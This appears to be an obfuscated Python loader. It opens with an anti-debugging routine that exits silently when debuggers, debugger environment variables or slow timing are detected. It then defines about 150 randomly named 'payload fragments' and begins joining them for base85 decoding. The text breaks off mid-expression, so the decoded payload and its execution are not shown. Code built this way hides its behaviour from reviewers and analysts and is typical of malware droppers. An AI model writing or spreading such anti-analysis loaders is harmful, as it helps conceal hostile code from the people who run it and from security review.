#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys as _sys
import os as _os
import time as _time

def _anti_debug_check():
    # Vérifie uniquement les debuggers interactifs réels (pas coverage/profile)
    _bad_modules = [
        'pydevd', '_pydev_bundle', 'pydevd_tracing', 'pydevd_plugins',
        'debugpy', 'pydevd_runfiles',
    ]
    for _m in _bad_modules:
        if _m in _sys.modules:
            _sys.exit(0)

    # Variables d'environnement de debuggers interactifs seulement
    _bad_env = [
        'PYDEVD_USE_FRAME_EVAL', 'PYCHARM_HOSTED',
        'DEBUGPY_LAUNCHER_PORT',
    ]
    for _e in _bad_env:
        if _os.environ.get(_e):
            _sys.exit(0)

    # Timing : seuil large (5s) pour éviter faux positifs sur machines lentes
    _t0 = _time.perf_counter()
    _x = 0
    for _i in range(5000):
        _x ^= _i
    _dt = _time.perf_counter() - _t0
    if _dt > 5.0:
        _sys.exit(0)

    # Windows uniquement : IsDebuggerPresent (API fiable, pas de faux positif)
    try:
        import ctypes
        if hasattr(ctypes, 'windll'):
            if ctypes.windll.kernel32.IsDebuggerPresent():
                _sys.exit(0)
    except Exception:
        pass

_anti_debug_check()
del _anti_debug_check

import sys as _sys

# ---- Payload fragments ----
_cnhEf87jl5d9Pn = '{~``!)J8q5v3sKOB`=f@n8`8Dcl!(Rt6BZ$&}$@GgV7xlTvLDYrgGVz=Ne6k$=o_vB}}J'
_ceErhmTxECoYPw = 'HuU|y36yeBUd(_#=`MQRD(bQ95{UFky1Un^EWpG1MA<{{{^Hi-xd^sRHcrD};e^C{kjnz'
_conNjJ9H50lhsa = '|g|E>R8ZX3h4eD@jectK&SvuXA~XVaxLUw31d7uICe{~A2gLeIEycN}+ZV!g+5)D8KqWk'
_ceYb8XtV3oyN3j = 'Iq*eliWrvO@_oTu>AYv)k+GY@}0euh;*H-GsIiGl$T@T<q6zxQA=q>vww4byNzZ*09H!9'
_cgdK59P35Q0a8D = 'V{0_`XsmnAf8~Z@$mg%4Wz!y|L-;CD``<?e80ivC76PmoLUwrYU%+9<BX}hiu>(`bo2tC'
_cbeWMYIi_qJg9d = '|Ao1BmT2rm8Gqe;((xrd9DKy<0X-U%Rws0n9^2rW_2{Il0F9fW<8#)ZjyB*0A(w@_gN60'
_cnYn6p1bQb1miK = 'D%f>)eR$!$k0t!6VWzR&y&;8ORFw;}m5i8t<FlA+<{yd4hrON1Ta<n1juV*n?j{2sd-yU'
_cqAdTN_0ATFSYW = 'oylaxtU`SD3hG#GzI(G!F_)cy+s8686z+i^7a<?@ctUN86egUDx>7ogQyeC@4uX`Rj0{g'
_cjSPrsZ707h_Yh = 'gRy=fQm<sW_9{+t_i{>nk;{;<v;+VHRaT@xU!|oeo|Y3-8anprL;Jn`jO8&Y}bm7EP8)Y'
_cdBNURKnFUNCQu = '#YxU^jC70%NlodpPNJn5#lnt?Iwv#_YXcee)yX^QB_*HHLyNUz{~#@*V|Hg^#9-%>;m=='
_cprE6ZmX7I0BZ9 = 'B`xSR!k92H;?(4rLSY~C{W9a2{b$$e@or_!-V)qX-iVZye46ceaLq8XaV3*wL<P<sVs{E'
_cdUZCDbwZ2VREK = 'rUvT;eQT%pJxX41M1+m#L#)OLnkGp!eap-#P5+3q+ppR-M&f8=4IKd2fI#*@ql{_WEh^A'
_cy6LVCSAMC0eDo = 'k(b%$faXlEks*X{yUoS86@Hyzm(V@46Rzv4$vawe>)bj%s18Eo)no>&%T-lZ13Oul;`C%'
_chgmkuerP_6yfo = 'eoC;oH=j;!7?9V~YCm_dMZqetPs{EM}{3$_d`I*M^@zlqmAL{~bOLPG6fb!}0*-dIaJHT'
_cp77QtHnB47zY4 = 'D9LH8#Jf)Z|6{hW9GP(REJGRyp#f+c<pfWnQmo+CSLt|k?_|dZAqA@-4anba}|ZT<C}d?'
_clKqzrCoTf08fj = 'IFWx@9)9%#X?^SkDeJ52&`~wj7i2!>{I{7-LzAy?GQs4baerXP22(|2b*w85^>z5Y0`!<'
_chHRsnKloDnh0Z = 'e4rYnzqt0+&s)-H4!AC-4+6xY1FI}5%fyT0K^Pk*JNrgS0V}xF|k9!VsT_*g|@Oq}mB)3'
_cwN8iMbvefrHEf = 'A}o**!s@xg?<_oN?I5W8$6GBGpp-^7X}@SOEG{^4*4OW8uIy`$a9*)cxweL5Y_8T`x^k='
_c_NUFs87w8n6wD = '0%z7%bgk)i7y>T;2zTj#;hql2ds>woyuz%D=TS#(HTy%w%kb4Loa#(;f`tU%M5W|Hl?Wg'
_cvsUNz8hThWAkP = '#jpHfcRa%QEDqXa&1cpIcLl9z5q0l<e`)?aqT_h-75NWH5RwG`0F2Kz@V}{IgZ_il>z`m'
_cn6Atp_QzsYHPD = 'CyZjT_M+9JkC9;YZEkUpe%mx&b?#Q_v7m{pq=#b_0NCF(xwCaI14@O^o_V|movSnv_U=}'
_crTtozopCMRXqa = 'qhKgh3xENf}yk}^&FNkgg)#qU=z#}802L|FD3E|4JknNgm>0zeb+munf_806@(fMuqRgY'
_cmcRYgxmb1igOy = 'HS7rukEqU>nh{T9NpCTGXQ9cyc!SV6B-t_ChJ1w_;{<C-$uNqV>svR4NFBr|fcn!F8fqH'
_ckH4HFHd7hBTkC = 'G;8%vVE579XgSbyZPC<fW1?r=X2a(Ahk4dN^X3F~wo(r2Q;(+&NHJfHP6HuqET;HFe$Ga'
_cvcstyWhzaQkH7 = 'rz5ewBD6sgd?i2&Y|4OQrMuaG4i<}ioW%O6Nz%eFuL6hwpq>~obB&&)y&UE5J7^4-)GxC'
_cmSmJlSkz76vJB = 'H4eHfrp6B13c;unm3)5CS@E3L@R|P9z9lt&6TU57W~<87xC!P65@*4=np-i-P1OlW7XC$'
_clkLF20R5BP4Nb = ';Fi|iPt5-WnmpblLWI%vE!wgN$h7+qNmIBkg;PN~oOVohl@6wsOMu=@{>m%*U4irmQX9A'
_cjBuHMYhgjAok_ = 'j01P~aD@;p;X+Z$p?n-R*^?x@v%p3N6uthSZqc_Ztdr5Ua*e!#84T;BERamrP@c9)LuJ>'
_cs24aR_ZNi9e01 = '#*ba2W?+7-Ls+7HPR4EM1PN`tvJt#HWyq^4ZnVkr!MCzUejRtp|OPQ9PkX`4Y&IbYb=op'
_cdHZPOY9smO5TX = 'J^i~je1&=uZLzd^!I@nl4NMEFZKf*7={m%gLM=HHT!oobC)gqWYYnc#5|5e%fN5Jye_ER'
_cguZ2pjTGYjHQJ = 'czULb_3C@QNI-so@O(x(R2BVB%jN2A$LvnhMG{fK6pxFEmQ3!4PvA{l&DY5OF%p~Y0KFB'
_cpiFRdoo0f8Iup = 'lXA0rXT)=^_Ivy!B&oksX4#ZDBap&7rPhFXQi0$A49S(}Vph3LIHNdo=0v3*-Qx`)Oq9#'
_cfpd5ks0cSG5vx = '75My|o{M0eP2#z|J96Dm_U-JA$N-JRJ98$Uh?O{%jWM_noxGKWvqL%H(9lbE8pMy&dSHB'
_ceZEkxEBT2Bblu = 'X#nHr3wiv9PYmgJVdhiC4{2H_OtALo`6=<jY@CRDHUAENGXm?s5@q#zve7t?D>%Ix+;ln'
_cb2qwM6fUXV_sB = 'UD_&`dfFDCYjbQvx9p6R)3gk<WCv8HzvtX{#0M=d}3g=ZSHu~zAr@L8<={-sr{&(Aw;?;'
_cvdynFLTI0rZnm = 'sUZ<(A0$%;6!P1-wMFOT#nQg0RJ9E^0XnvUM)sN7+_VHcIEaZcY4a%n+vusKp%BMr!p=v'
_clZZAKPxW_M3r7 = '@?N4Dp7!b4Xc$v;B(j6LoH9A3enE}xHU3#uP+X$VraQeD#ZLV*5+UttEBZ_ILtkuvX#VD'
_ctaX10Ls_53RdN = 'B(w89NDyQ6m+<C64po1!aFSnri-$`B}LJshD9`)go49|=Nj&itYbRPeDYvVwgtoeVZ4Ym'
_cxwrcCNOjaH46O = '!cexj4Nn6#qkKaYvXABaV9e=tB46{Pk>je&%+W1nZ0MNB2*s#5=E6aR>vZ_??Xro$xaCM'
_cayPO8kxY6gRY0 = 'MX$!+J>>HmNjqJ^xK|^Q*aq8SZt=oKUFcScf6D}E{)NbIonGa(-tkgCqfRY#dSO+{c7*r'
_c_Wk_vcxpkyrE3 = '=p8a$Qi`DMC-F|qD0c>!PTFv5rur5{G{@{#8rq1t^7Y~CE1emx!}8?45pCj!*f@i*N3gf'
_cp4IzYkL_Sr6GI = 'd)>b3CwJ_AgmenR5kT`B?Y9s!k6*sSyD8t(H?ZV%E=m~katnz1eY~g{!NOxRaYHeC%m~p'
_cgNlOPJV2lxm9s = 'ufaM!LS0X?o*7R)rLr1Q8HXyhxM9z`7ORIEs7j$4EnHQ49yzH0vDIncKkzQ2+j#`_o=qr'
_cg0gTkLM8cxwwU = 'ey&cB^hvmH@g-$yNQNIp@I9ccZ1@&Qu~uWh2tE(Bg`e_+)7=e|rDrHt#GtpOYO$;1?IcG'
_cjd3Y0OjQhSwqx = '<HzmB=z))axQT;=5337#iSZ39SN&v(LQgowKOAeR!It+7T)e3#Y#DAQK_MKLEe`zis^l&'
_canNDI5nK4WO3O = 'tx6?9sLytxEY8*ZsuOJ7rTWNJC%CwINEPAb3gEq$Sk3Ju{Uqk>eHsDeZ3wC<wA+9Cw~vB'
_crCVVJnKAEQcDK = 'OBO*GQYD>_A<{!^IoxboRY%ek%50t_VI9iV*WYB0sVI?HmbuAmghc;z=7J38PvtUHnOgP'
_cxG_le5Q0Va4kj = '2C4@1ROXS6lFMKWCGf$Wk0<U~hsb4b2ByE_wPa82ru59yA`=>ltBC4=C6P4VdY{>f|5<q'
_cp0mvCXcJJmPT7 = 'FRG8QQyQobo-;CI*0dFV03MMv`5tPGT->e)@Eej}{oKC_U*j)unhpP5ub$0i0V3>MOsX*'
_cj94QRvX9o5muM = 'K!^qgGxAg3q99cx!3#)*P^Raobsz*lj74SD12)@Z?EB4Coe*O5lc3fL#uw;NsL29S)KCt'
_crEH5fUQzjkjkW = 'B-k#ZP5eR50a{K>7sVD83*FbfjNDq_?1H*bPiE6O@NXRr12{0qy4}zJf^@5`R~d=sz#8z'
_ci65gZamerZbVu = ';*Oz8qLB@iWBpYJq#;!2Q36#2I8>#|y?3HXXowfw))hm7?k%D){$7$8KE>c(TQFGn^2>7'
_crmNjzecaBKa6y = '`MEJB#6Z2PGpQ{wZKYd+)PjG%(~C@mJF@R2Q&sf3^Uy>&R++^<X<+1eakvCX-q=`M!!_c'
_ci9AmreuA60Al5 = 'L@C2_(MGXVRIz7CSM6IBRl8*TzEwYpVpLIIBZ?x>bxkM4UX$;f_Ip_tEefy~)V<tGrc$l'
_cdhGxbTAADTTyK = 'Hw?53O6}l)3Ck$NnX72Ytl)czRM*5Dwg3+TPqk5JTYy<sq1s2iYo#2(v{?&du~W>aC}Rk'
_cllinscaokd9Jv = 'vMB&bfg@Ka;=mV5!)75^vmgeb&mPH&rA6vuUMsW~+G;1023an`_Ud7B^Ym9leQn|qq<4T'
_cgY6bPHpJRHn5N = 'WC`6Kq=q#GbS5qmP8N~D8^Vdgx3c~Q$AK?EToO0t-$E;1k)JFJP{`E1{7mQs56Qy;BMj^'
_cfdHRhZX0rjAgp = 'fDkI<)_F||BhuW5Mmq^K(v=}h8!jInl^MC-W1d>8d}5V^qc<LH1hu_}>f&Zf<0QP0sLvI'
_cz3NB6IY7U4lmW = '8)bd&{<QU94C&s<_GJVG^e1zm~BX&?WU*>9o|u7qZp*(-Cj~Og`)#0LxHU3FATZwnc#gK'
_cg_24wUV7TM4L3 = 'm`o0+Db?rTg8KWlb;Z?;yo*QWI<7s$aXHUXY$UjuuG-H5fy?M>>-H#RuC`pC_d_H^&jYq'
_cpwqlJSZPuM60T = 'n&^gU2U51(K{^e5E8iDh!UJ;x<KKL*E@Zg|a6k0Qza#=RSK%g+V9V*PQg#ukhsieij|L-'
_cg0q73GKSeZibW = '-aDs}-u#2Pc9Keg#X)}^UDRvTCuP<?~o?<A1=#g5ok(MenDShOMpT)PF4r_%RUK=94Eh&'
_chX9zO7Bk_cWUF = 'T^Hh>}zASWyA*OnqvpE2I;dmJG#q$2BFIVL7!E>DR^hB}yePR_|hHR!*=g$oCL$CAOvv@'
_cp3r6bTynCZxo4 = '~{n)=zBk51B;8qZGt}S-JJb!Jj$dsc3`zBX6(g#OLaPQjG2E?8xT9u>H8nir8M<JAv}k9'
_cmM9UMxYDARP2Y = 'ZC^%wZjT~h3SjOB8r<$l!})|v-z-e(7IY&KsSF9%Hg|!b0S4TNpetEksl~ux7ge|T<>k%'
_cfA5QdgqpBmAsZ = 'iBgOIst00%?QnwbY3)=?KGa;bu0z+<*mZZMt&h7ikh6wX3mbsE-6!-ik3$JNVH+>m{6>O'
_cmCHRGCRx7P1kL = 'PA{O*9>gzB+Nk0P=%qK|fz(-g}E<LT{H!kyUtoQt?SF{LWrnHh7$;*ML8I&i@(nMzZcy`'
_cjq7cu_YZszT1J = '>i#)QbKs40)D#cIUt0Xb+Zu5-RHc&O*znCIFDRX_kk>z%(3@JOqNyUP{kG+$~dN`lQy^;'
_cz936Lag36aPG6 = 'cdOn!n0AJRYWNQo0qkga;POnAq`9jMKdSF;)ROs2iaQ9$~Oqa0d0NIa)~g8wGoeAd*8vD'
_cyfTQNNnxfVNKb = 'hW$!y(aHrY?t(tf;0ZKOWQ;uj3Wih^Nv1#d~k1<)%&$0*N;}BU?Jo1{I#dDl!l|7?M9h6'
_cbraz4S2FdsM1a = 'gY9<SST8U@3z6vyppgu?ha}DMV&9>((zh_SXPCFud}tfIo*t{PE_U%D2CV4G14L15pE89'
_cqeSB9XZ3aoyVQ = '<ox^t|!2CC$>m~4OHP5K|f6u#Ltj+=2Nrug^Nk?3rpsyd(`7ldp@E1)E?t3ep!RD_*P;7'
_ct1OsWVehsTUIT = '{VlY0Q-d7nz=p51=f<%Ju+dvg$X%DbGHT`EZR#`wXno#F1;xCO16HQTUS5K=wlkvqkmJ6'
_clstD40BjmGq1G = '(>Y>!M8j_UMwqmys>pYX0UCF7n2Ut8NHYX)5WOrMfven_<gZzvT1(DUy`?q@uw1c5EGLa'
_cpb4EChtfUMZMP = '@qS4qzWJaOL+G#m4HbOMqc2%*>H5rN=7B{$3$00oL0nW+l{Nqz&)4&Dk4liKcwPVIo+-l'
_cxd8gUXak_y1Ov = ';VTR+mMt#bk&-KL!ZeQYm(Jpw9Rs>)EPSqKcCH`u>QU$Yq)h8B1IUNx5h59m{WdcY_|Uu'
_czkrQODmUjIrUP = '6(NI_@_e5fyj<`kOuHJ7K4nfM*NbRzXiCx0=n1ux7SD~R_bzfIPUw&sRP?@?1IuqdLIG('
_cqR0VvgyqX90Dw = 'Z1qZ28F%sKR%Y;D1#5V*yiXGx_k^;@lJa{}#GU|Z9J3)a~6)B`tGPGTAnf;0N@0&kr3Qz'
_crwaeiCryZhSh5 = 'z1-IU@kmW`^K1Ni!%J*8!8olRfibQN-sh9QPB*is($JH>q%ang0wqdxdO$$3jnV-qVJFz'
_cyV7AzlY1ZkNKr = '0WT#cX7kkR1=?Z3YJz)6|4sM^u1BJ<Ksli$Pa8|>#%J(iD~b{kOX+5qo0|%X5#OG6X{tL'
_clfzr0H9g2xHkS = '^BSEWI}lMe&8ur4DXmZ3*K8~0WMkvHPa$Kf9{22Z0LkhpqvGP`RL0{u<t=!4Xfp=?=&v5'
_cyF_aXvOsXgYjU = 'XY7{6fb6vq3Cw4T*?;fRuzSFgfi`}0zY7HSvanRY3&PWXrUJ@-3KNAW+Qz!yaoEpsE_ll'
_coLN4GgoYcfM4x = 'j>pHO_H^sY%){H{DZ05rSV-F6;(;`e#w=2M=nPi6@IY%wDhSC9doT*sQl9oEeKF(6!ab9'
_cv_4gjZJmZysUS = 'EEm%9DzZL~uZ^xtDg!ET!mcI?lo3-zdv3R@V!{#AfhClV`EfGa+*!ynVpabL-`yr?#|x7'
_cvIaXvXr7iLRCY = 'cMD<HLB9DWXY7r&J<GPls&ug6EBR>Q}K=Fhe0g&5(0Cx2{#Ayt}!t33<eL3>X@=GK{Oo7'
_cvDhClLzjFMvIy = 'H|3(TfTptnzlGI1O=C_qhjTm~tb=PEOo&eXx>~47=77vrJk?3FmJ$CJ6L^D&IRA{L3)S?'
_ccksRLyzgP8HZE = '~-ZD1y1Ajl(GKp55SHXCDq4&oq290IuR6G89H+tFll7)1v568|ip8eRtGjnjgz`H0`wYT'
_ccYbx03kjDMPcs = 'VKwb44@+2}J{{lqKLhdHYN(m8n>xCk@)ENCXsv(EP&Tyx#vaF+T+9c1dWsTphSLFBivLh'
_ckuJyeJ3VLep0Q = 'K;#Z=d(##Z+oFVA+Ax_v}kv7hjzK&ucmKZvKNiFUQQ(sgA@lm57GO_V^MFczASN2#6?>P'
_cx4Ct0oq3SAVTG = 'l<P9755(otx6J|8rkg%Oqz>hbII(%@ilH`IyAeO{nwI3+-BNufwbhvc{6rIR9JxJNg}=r'
_ckri_TgmvUWuIp = 'ZbhgB2p9sBZ<9-6Hh$b{x^1h-xR1AhI8*a}$&?@Oe9a$*u?Jq9s}C)DIXQlcEBKu|tuBl'
_cfXr2R2Pek7Ovq = 'Vo2a5A;L{TT3$wn9&-zg(_nA$_SQtO+sKl*~e}Cy$1z4d&O@2F+skf0dPG`B*oRFi#Sf)'
_ckU8gVekVijoFi = '>`svatKyQ)koBsOTP*lL*2zBM3ozeJs4CDP2K%<He*Xv8;=Tk0_7gjodFE#+Y0){1798F'
_cx_E1kRmZ1Jodg = '2xQD3Y`U-4sr24RD_kru?*h3eD3_sXU>h23UN8=GhsM*nuNp>fP?~y)-m)h_Z{$K1zzP?'
_cgy10QNxR1XlCm = 'iXNkWR_JOg74JNem1Y9pBgVKV7;<R)4{^OwZ4LGL1raGs=Euhkf1~FjOokeXRPeVo*3!~'
_cgAF1sRKpaiIsA = 'cfx@r&%2{<up^HoZLYBQblBdX+ouIL$8(7bisQWZKFhr-hE}8<20MEp@@s)`=b;0i8I#R'
_cmm7Z4P1BibjzM = 'h-m*J1=uY3%BPTO=>!34RTk6H6%v03iOYSDt30&ENU@}I5x~<|e7?h^!9gFek99lf~9I%'
_coZsJpoPjzzvc8 = 'EQ7Kckf6xN|yC81+pbZsD3dI#xKZ6Yo%3j-{vNVUr9pKDWu1UdCMLakJjDI1<~r}T+N5z'
_cssJ08mIwWLeEI = '5MK=Zw5_^a=g?o($`O^|Wkl{IUL^AXf+RfV?W$m!4>U;4S`IkQaFlN79qj0B!$HYpG}O&'
_crNRQu3ugbTZ_q = '~slXE(Z4J)p2g)#mJ=u=l`u4i9|;Xy4|*gS8+nrl_?VDVrena#=Nb2bgBLzaR8XRvm}E~'
_cm9T6cGqL0I10r = 'Jl;2$A%6ixnHTGQ^8uWi2~o*rPgt0?bK4QP=sU2E7_cx^LAH#}F9!vGDv}n2UR593sAsW'
_cfSeS9GA14K8zO = 'ziH+V_Z3EDYp3te9$+ovm4EBo{WqOCWMcU&kQU8f8NkRH}uFZC5dt4YX(XYOK*{r%E#pd'
_cx8W1M4rikaCDD = 'yNLdLEWJ;TAqnp09`j(*BkU5A0qrH^qd|Cnn`*=!n%5QBwX>i)xfMPo@0LxS$PBlaM!am'
_ceNZC7Ie32EC7D = 'eVzwQH$5YmRY#Y8?Y_zZGc$k30%@HuN?C<qNt^)4gXHA<811ym;LVapU^sn%w%-L)Yl)0'
_cvgUvrNcNcqMve = '>-g{&#`BNAl&z9d--VyX>HGDy}MLHj9*l5Ao=9JwxMxg>tGo|`v|#6Ai+<Y(M&#54<b>j'
_cvoPtWIy7cLNK9 = 's7PNi&vp=|Xt6LIfoT3hG;TTroZjwk)x#zQVt2Scv2nxqG;AtGe_QTa)Hoxs^7}gQsFyJ'
_cpopb0LufvGYtj = 'dqcVW*AFhwvGjY{Yut`(4zI(gF_ebD}zr3HSAR$M(7af62AO5c_QDW~p%W@bROo0~@U&@'
_cm7aIJ80l0hFG9 = 'MK2Qur`af9kX8xV2IS-@IvPVCDqR3{!eG>jz*>IGu3eNL1%Qm3Xhmpu}Vmn{lxNtpwCgm'
_crCf8g6VghvNO_ = 'v*=W>Y&+&)I?-1Dd5$;fmvYI|*Szlx~b`k>`rXEVQx#2Y=>w^-^VFkYBW<^-wxn3QQMlw'
_cr5XXi4Q64YuCz = 'N8+hSz>A9H!vMPx@4vu_yBLeP}D<7wZ^aI1NK8eq-7vAemCH?In*j4wI<joxns>@O|j2$'
_cylyIPCwCzWp2q = 'u+N;h5(=)HX(a`Bu&iP4Z<`;mH@62`OVQJfwX(6PK*m#7KD8D|&05Aw!{0=WLoH>*=Q>Z'
_cylrVzbVo06Y5A = 'V^@Ha28YwT`|L7bPqwPP-@h(VHF_z6@bHPB#4LV+-QZQ1ag$Ozm5M7gX8_&*@{g#|%c9O'
_cdkrZkco1FJxKy = 'sM?q5n+@0wab4TxtzUJC$p0~p}}RYgsBoSaHsB{9|Rtxr)Nj0s}Jl>&gN?_>g<LN#3+#a'
_cn7dRRm95GjqUB = '%MAyilEsz{>7U3xcY+iw*)??hR{nc8f*4yJ74eAcL&&5En=7GW1NauL}In{25a(x>1vB#'
_cyZArJbk4IkCiJ = '*`2L;av{ZgsZmAIIcsw5Z0^=OW#1_0QgsZ#lgC>7*A1wYlg@!uc(qIa`zp+tun@@62F8l'
_cbQs3fQoi01Evw = 'NaBu-<~i^JRP=4%g7(n-X8sQOgWjc~88bg)eqq~_IgJp02nvS0bR|=z{qSUR_9?E&H}hG'
_cio886HeLVwsgz = 'Bv!=Nbeue{a!-R|%%{cGLuv}1A3Cd-AAwte+_wgz8`k|XdNXhc9VM&u?qn2Kc#5+&mICn'
_cgFMNUbH2HQRRZ = 'vT=-1S~mE7p40X2c`I@&o&8Fud*VHAHszx-!dV|JD$qzp)2PGe0P#rp%Ayz*;j2*WF3>y'
_ck5pRA1C45ONBp = 'p%^gCU48@z)#*H+JE`v@7`4?8<;$MsaTiSuyjX?I*u;It)qxXpB>Y4L6j(qGel=sn8=my'
_cqHoqeMIq7msPp = 'mB%n-z~Wbl1uQ^xxN%et>OQeLN7mx;ng05Vpw3No>dr*6svw0!n+*hFd!m<H>R*~6a82$'
_cp6vav7AW0J_UO = '(RfaEj&6z97&Nm32(NaS;FXLH;iIabQyi~HLn@3l(?d9zFsP40TXp=(_UGu#<^!QKhfa^'
_cmuKAOZG85hC6G = 'b6_w13T~1j!xv7LabD9jlc!40~P%p&s`?0)rGzT3!9QcstT9wk#&&L#W#rP?(t?@;byi9'
_cycBEvESFPe8CK = 'u>?Gc;DZ$8Qe(r=PDoot%3SA2_{k0JXBoks>HXAW#h*-yRd0ktJ?on=}9Sm0JfO~S}vPR'
_cjWMUxNzscvqLE = 'D2ht_}JUjdM;oRM@>-<&Fo{R(3y%$_Yf>k4HSRV=oPD<hCqK#(4_n+>UUS-0Q-g2kP}DF'
_c_uyFLfaXFbPfW = 't~mp%neUAlOD2b<)f#pt6IuKju(pyAhrMR+uO4L{}a=01PCTA<d3$L#OsxB@y^K%1nE=>'
_crGIEEkCA0yDXc = 'j>mN!sbGBT8=faLCOUgfvE((tDQ@Nw3zNhw@v(<onqvWw{G`V6eT#qNgeE*rnZ27O3xjM'
_cgreVUc6EzQByn = '+r28HLtE@L4K@}A#Lk|3^9?JV7+HY~OzzNN|bYT8m3S7wf`LV^Bw@2aV9YHt^8#G{{<UY'
_cyUu8WB1pGNk7O = 'qpF!7g_;pK%-#63KjFTMfi=iRJB_gymbC%`?F>t~hy*%vfp4_x>-CrQkfGxI4k-L<Qjy^'
_cyiVeo5wJL94yP = '9Ap+rAygEVYc0;}wM@19FV{nG_9~!`gK*C{7+2O~mx>Cu(}*hURs@f!k2mX62{soiBtRn'
_cnkT1cSNwgQXnJ = '&+Bq*L0%cpe*9X9iTp)m_Lzq1}mRaLr}#>=ZF<#yKb5zr1l`5ST;WYaMj#$0@VR}<ayjN'
_cc_UeO6LaMXreT = 'fB)kN-xsd|kkq4DpgfvZ=;ZL4X^e+<$MKGKUB<T_0lP~=v8-l!jio52#%z#qa@sWwl{&A'
_cyuE7iBlvJu1yX = '0i*mTW;Ff?1b0?3PN^dEuM^-0d6bU(MzjqE3P=+$sb3Ep>XG7wL;{g$#sI<7yYO+CNG>8'
_caPdp19GKOAHVl = 'zXZ4=khne5VDqbzVSeTW~`Xo3jw|DuT^>!=87aR^su_geH8b^L(^QUf?UH`RSW07eG;Yx'
_ctVs2tCL5w8V0K = '*t8nutqvFwc5Ig31VOl4fPUWxb+nA`yYn&q}lKyGqGn!R=q`js=KXLmLb2yvRLF)IS(1n'
_claiYa7nrFmnIV = '}l#@D)Rvgcsjd@_P0=~Vy-oY&sJmQWKbpPKDNmBR6!w!YkRMG4Z+Xd5Yu1Kz?Xm^|4cY='
_caW0dXv6PTqQTq = 'Z{}rg-i_iR#)ooG_{#iRl<T-YEaR3l_tw{PVieyk`HwxAjNyYEQoNDKdW>gB%>a{o1>@q'
_cpIaO4m2lO75ge = '7b-L53XS7Ch52kxCKOBmML&J)hURbyzU={2lk`v_PqkPB>7Ur3}M<l+Hn+dQg3KQJ6o*h'
_czKlmQWzSctbOT = 'J59~nQr5qGW<(C$NoJ9^wv3oicEaPHp!YL5e>#XU|R`j|K=XHBQ0LXk_j>3w@0(PVq44f'
_czw_OdElSaF0Dq = '5RgU;+K?7SCQ8e2ILUdL`aj-mk;<`P7`TbMvsD>TB%(#)<qi7b?ioQ0j>tH;&(;;i1lSb'
_colbrM17OXHP9X = '44F^`|z?*wnLY=&7R|3`JkVXop4hi+t&uID|aUhGPepYPTO`Z1W@ug0PCP{kk&m9E&hWl'
_cry1OLjWtNJHd1 = 'P;Sti*|kcSbEVDsDqi(BzwELUklq9v45_6K<7_}IYcAS6yWy^z#bfwx;b9){A4EK_<?iu'
_cbOAmzJzFGpjGv = 'UnTjA!uG&6#9l}lqt^)d}7%2nm#%~nPZ^^BZ)bGU%ik3w>f*3KU=wfkb{~Keytr2Du3MF'
_cdaxm2j3ZjZlUW = '`Stb4KVl(6O7SaU7kwhoK@n)dr<8qHI=grm=E5#v0z&HPY6V`0T9dycV;tC(SHyEd}!xU'
_chk4InquN71ZUk = ';=T*LPM{?F_!tv6b4Iq~Fp1ISmcx@BYSJs;6qTkjM{d^a>L-<L$Dtmb>LKoslnF3}!B;X'
_czZQfe2cCPwagq = '~8?)%^e1k#~Be$lIa{Lh~j86<90%pAZp{O1-*@CJY%L_lRRE|M_t?GQSB%u!sm}h#+V*<'
_coSf5iAqFq81W0 = 'L!t9W{WfYVo(3PEV#M@PqlENr^%XB(czcQ*rj6;tWd1r7xGO%IGx-#=$1)n$&FSUX-Fnk'
_cqtHI3j_bT0R0A = 'eLpl+AvST09{l9313a93;h7oM?Y>e>i=rr6{-a+kd4<vj83H-pRPy#DD#c!OS{;V|'

_pnTyJWWXMj4Pdy = __import__('base64').b85decode(_cnhEf87jl5d9Pn + _ceErhmTxECoYPw + _conNjJ9H50lhsa + _ceYb8XtV3oyN3j + _cgdK59P35Q0a8D + _cbeWMYIi_qJg9d + _cnYn6p1bQb1miK + _cqAdTN_0ATFSYW + _cjSPrsZ707h_Yh + _cdBNURKnFUNCQu + _cprE6ZmX7I0BZ9 + _cdUZCDbwZ2VREK + _cy6LVCSAMC0eDo + _chgmkuerP_6yfo + _cp77QtHnB47zY4 + _clKqzrCoTf08fj + _chHRsnKloDnh0Z + _cwN8iMbvefrHEf + _c_NUFs87w8n6wD + _cvsUNz8hThWAkP + _cn6Atp_QzsYHPD + _crTtozopCMRXqa + _cmcRYgxmb1igOy + _ckH4HFHd7hBTkC + _cvcstyWhzaQkH7 + _cmSmJlSkz76vJB + _clkLF20R5BP4Nb + _cjBuHMYhgjAok_ + _cs24aR_ZNi9e01 + _cdHZPOY9smO5TX + _cguZ2pjTGYjHQJ + _cpiFRdoo0f8Iup + _cfpd5ks0cSG5vx + _ceZEkxEBT2Bblu + _cb2qwM6fUXV_sB + _cvdynFLTI0rZnm + _clZZAKPxW_M3r7 + _ctaX10Ls_53RdN + _cxwrcCNOjaH46O + _cayPO8kxY6gRY0 + _c_Wk_vcxpkyrE3 + _cp4IzYkL_Sr6GI + _cgNlOPJV2lxm9s + _cg0gTkLM8cxwwU + _cjd3Y0OjQhSwqx + _canNDI5nK4WO3O + _crCVVJnKAEQcDK + _cxG_le5Q0Va4kj + _cp0mvCXcJJmPT7 + _cj94QRvX9o5muM + _crEH5fUQzjkjkW + _ci65gZamerZbVu + _crmNjzecaBKa6y + _ci9AmreuA60Al5 + _cdhGxbTAADTTyK + _cllinscaokd9Jv + _cgY6bPHpJRHn5N + _cfdHRhZX0rjAgp + _cz3NB6IY7U4lmW + _cg_24wUV7TM4L3 + _cpwqlJSZPuM60T + _cg0q73GKSeZibW + _chX9zO7Bk_cWUF + _cp3r6bTynCZxo4 + _cmM9UMxYDARP2Y + _cfA5QdgqpBmAsZ + _cmCHRGCRx7P1kL + _cjq7cu_YZszT1J + _cz936Lag36aPG6 + _cyfTQNNnxfVNKb + _cbraz4S2FdsM1a + _cqeSB9XZ3aoyVQ + _ct1OsWVehsTUIT + _clstD40BjmGq1G + _cpb4EChtfUMZMP + _cxd8gUXak_y1Ov + _czkrQODmUjIrUP + _cqR0VvgyqX90Dw + _crwaeiCryZhSh5 + _cyV7AzlY1ZkNKr + _clfzr0H9g2xHkS + _cyF_aXvOsXgYjU + _coLN4GgoYcfM4x + _cv_4gjZJmZysUS + _cvIaXvXr7iLRCY + _cvDhClLzjFMvIy + _ccksRLyzgP8HZE + _ccYbx03kjDMPcs + _ckuJyeJ3VLep0Q + _cx4Ct0oq3SAVTG + _ckri_TgmvUWuIp + _cfXr2R2Pek7Ovq + _ckU8gVekVijoFi + _cx_E1kRmZ1Jodg + _cgy10QNxR1XlCm + _cgAF1sRKpaiIsA + _cmm7Z4P1BibjzM + _coZsJpoPjzzvc8 + 